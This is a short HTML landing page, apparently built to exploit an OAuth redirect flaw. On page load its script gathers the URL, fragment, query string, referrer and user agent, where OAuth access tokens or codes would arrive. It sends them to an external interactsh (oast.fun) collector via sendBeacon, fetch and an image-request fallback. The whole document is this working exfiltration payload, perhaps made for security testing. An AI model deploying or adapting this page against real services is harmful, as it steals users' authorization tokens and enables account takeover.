<!doctype html>
<html>
<head><meta charset="utf-8"><title>oauth break landing</title></head>
<body>
<pre id="out">Waiting for capture...</pre>
<script>
(async function(){
  const payload = {
    href: location.href,
    hash: location.hash,
    search: location.search,
    referrer: document.referrer,
    ua: navigator.userAgent,
    t: new Date().toISOString()
  };

  // Send to interactsh collector
  try {
    const beaconUrl = 'https://vqahejqkpdqmqpdshvnpwqo4u5qx501uy.oast.fun/collect';
    if (navigator.sendBeacon) {
      navigator.sendBeacon(beaconUrl, JSON.stringify(payload));
    } else {
      await fetch(beaconUrl, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(payload),
        keepalive: true
      });
    }
  } catch(e){ console.error(e); }

  // Image fallback GET (guarantees Interactsh logs a GET)
  try {
    const q = encodeURIComponent(JSON.stringify({hash:payload.hash, href:payload.href, t:payload.t}));
    const img = new Image();
    img.src = 'https://vqahejqkpdqmqpdshvnpwqo4u5qx501uy.oast.fun/collect?d=' + q;
    document.body.appendChild(img);
  } catch(e){ console.error(e); }

  document.getElementById('out').textContent = JSON.stringify(payload, null, 2);
})();
</script>
</body>
</html>
